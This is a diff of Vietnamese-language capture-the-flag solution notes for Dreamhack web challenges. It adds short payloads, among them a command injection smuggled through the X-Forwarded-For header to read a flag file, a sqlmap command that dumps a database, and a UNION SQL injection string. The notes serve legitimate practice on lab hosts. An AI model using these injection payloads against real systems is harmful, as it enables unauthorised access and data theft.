@@ -2,7 +2,7 @@
 ## Beginner
 ### php7cmp4re
 ```
-input1=7.:&inpit2=7:
+input1=7.:&input2=7:
 ```
 ### phpreg
 ```
@@ -121,4 +121,23 @@ leg=FlAG
 ### simple-phparse
 - URLencode for win
 ```http://host3.dreamhack.games:13101/fl%61g.php```
-###
+
+### what-is-my-ip
+- Chúng ta sẽ sử dụng ```X-Forwarded-For``` để kiểm soát input của IP.
+
+![image](https://github.com/user-attachments/assets/515bbc02-e412-405b-9019-e58dcf1c25dd)
+
+```X-Forwarded-For:$(cd ../; cat flag)```
+
+### BypassIF
+- Bài này vẫn là CMDinjection nhưng có thêm timeout.
+
+![image](https://github.com/user-attachments/assets/5cca85b7-0b88-404e-9946-fc83b294b1e0)
+
+- Nếu chúng ta cho server ```Sleep 10``` thì sẽ có key của admin.
+
+### baby-union
+- script kiddie go bruh bruh
+```sqlmap -u http://host3.dreamhack.games:24120/ --data "uid=a&upw=a" --dump```
+- hoặc
+```uid='+UNION+SELECT+sflag,+sclose,sname+,+svalue+FROM+onlyflag--+-&upw=a```
